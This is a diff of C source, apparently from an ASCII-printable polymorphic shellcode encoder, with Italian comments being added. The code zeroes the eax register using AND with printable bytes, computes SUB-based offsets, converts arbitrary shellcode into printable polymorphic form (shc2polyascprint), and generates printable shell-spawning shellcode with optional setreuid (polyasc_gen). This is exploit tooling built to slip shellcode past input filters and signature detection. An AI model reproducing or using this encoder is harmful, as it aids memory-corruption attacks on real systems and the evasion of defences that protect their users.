@@ -1,44 +1,70 @@
-
-void add_b(__u8 first[4], __u8 second[4], int i){
-	bool f[7], s[7];
-	int c,d=1;
-	f[0]=_random();
-	f[1]=!f[0];
-	for(c=2;c<7;c++) 
-		f[c]=_random();
-	s[0]=!f[0];
-	s[1]=!f[1];
-	for(c=2;c<7;c++)
-		s[c]=f[c] ? 0:_random();
-	first[i]=0;
-	for(c=6;c>=0;c--){
-		first[i]+=(f[c]*d);
-		d*=2;
+// add_b serve per generare dei numeri che siano
+// ASCII-printable che, "ANDati" tra loro, diano
+// come risultato 0.
+// Questa funzione è utilizzata in cleax per azzerare
+// il registro eax utilizzando solo AND.
+void add_b (__u8 first[4], __u8 second[4], int i) {
+	bool f [7], s [7];
+	int c, d;
+	d = 1;
+	// Il primo bit di f è generato casualmente.
+	f [0] = _random();
+	// Il secondo è la negazione del primo
+	// in modo che il numero che verrà generato
+	// risulti ASCII-printable.
+	f [1] = !f [0];
+	// Il resto viene generato casualmente
+	// sempre tramite la funzione _random ().
+	for (c=2;c<7;c++) 
+		f [c] = _random();
+	// I primi due bit di s sono la
+	// negazione dei primi due di f.
+	s [0] = !f[0];
+	s [1] = !f[1];
+	// Il resto di s viene settato (bit per bit)
+	// a 0 se il corrispettivo di f è uguale a 1,
+	// altrimenti il bit in questione viene
+	// randomizzato.
+	// 1 & 0, 0 & 1, 0 & 0 = 0
+	// 1 & 1 = 0
+	for (c=2;c<7;c++)
+		s [c] = f [c] ? 0 : _random();
+	// Vengono infine copiati i numeri ottenuti
+	// all'interno di first e second.
+	first [i] = 0;
+	for (c=6;c>=0;c--) {
+		first [i] += (f[c]*d);
+		d *= 2;
 	}
-	second[i]=0;
-	d=1;
-	for(c=6;c>=0;c--){
-		second[i]+=s[c]*d;
-		d*=2;
+	second [i] = 0;
+	d = 1;
+	for (c=6;c>=0;c--) {
+		second [i] += s [c]*d;
+		d *= 2;
 	}
 }
 
-void cleax(char *str){
-	__u8 primo[4], secondo[4];
+// Questa funzione serve per azzerare il registro eax 
+// utilizzando degli operatori AND.
+void cleax (char *str) {
+	__u8 first [4], second [4];
 	int j;
-	for (j=0;j<4;j++) add_b(primo, secondo, j);
-	sprintf(str,"%%%c%c%c%c%%%c%c%c%c", primo[0],primo[1],primo[2],primo[3],secondo[0],secondo[1],secondo[2],secondo[3]);
+	for (j=0;j<4;j++)
+		add_b(first, second, j);
+	sprintf(str,"%%%c%c%c%c%%%c%c%c%c", first [0],first [1],first [2],first [3],second [0],second [1],second [2],second [3]);
 }
 
 int test(__u8 f, __u8 s, int n, int j){
-	int r=0;
-	if ((0x20*n<=(f-s-j)+r*0x100)&&((f-s-j)+r*0x100<=0x7e*n)) return 0;
-	else if((f-s-j)+r*0x100>0x7e*n) return -1;
-	else{
-		while((f-s-j)+(r++)*0x100<=0x7e*n)
-			if ((0x20*n<=(f-s-j)+r*0x100)&&((f-s-j)+r*0x100<=0x7e*n)) return r;
-		
-	}
+	int r;
+	r = 0;
+	if ((0x20*n<=(f-s-j)+r*0x100) && ((f-s-j)+r*0x100<=0x7e*n))
+		return 0;
+	else if ((f-s-j)+r*0x100>0x7e*n)
+		return -1;
+	else 
+		while ((f-s-j)+(r++)*0x100<=0x7e*n)
+			if ((0x20*n<=(f-s-j)+r*0x100) && ((f-s-j)+r*0x100<=0x7e*n))
+				return r;
 	return -1;
 }
 
@@ -105,7 +131,8 @@ void subeax(char *str, __u8 start[4], __u8 end[4]){
 	}
 }
 
-
+//Questa funzione converte uno shellcode non ascii printable in uno polimorfico ascii printable
+//Per conoscere il funzionamento vedere la documentazione
 char *shc2polyascprint (__u8 *shellcode, int sh_len, int n, long long int s) {
 	int i = 11, d, k, inc;
 	unsigned long long us;
@@ -120,7 +147,6 @@ char *shc2polyascprint (__u8 *shellcode, int sh_len, int n, long long int s) {
 		a[2]=((us-a[3])/0x100)%0x100;
 		a[1]=(us-a[3]-a[2]*0x100)/0x10000;
 		a[0]=((us-a[3]-a[2]*0x100-a[1]*0x10000)/0x1000000)%0x100;
-		printf("%.02x %.02x %.02x %.02x\n", a[0],a[1],a[2],a[3]);
 		subeax (tmp, a, b);
 		i += strlen (tmp);
 		i += 2;
@@ -215,6 +241,8 @@ char *shc2polyascprint (__u8 *shellcode, int sh_len, int n, long long int s) {
 	return shc;
 }
 
+//Questa funzione genera uno shellcode ASCII printable che utilizza una tecnica diversa da quella precendente
+//(per funzionamento cfr documentazione).
 char* polyasc_gen(char *cmd, char *shell, bool setreuid,long long int s, int j){
 	__u8 a[4]={0x00, 0x00, 0x00, 0x00}, b[4] = {0x00, 0x00, 0x00, 0x00};
 	char def_shell[8]=DEF_PATH;
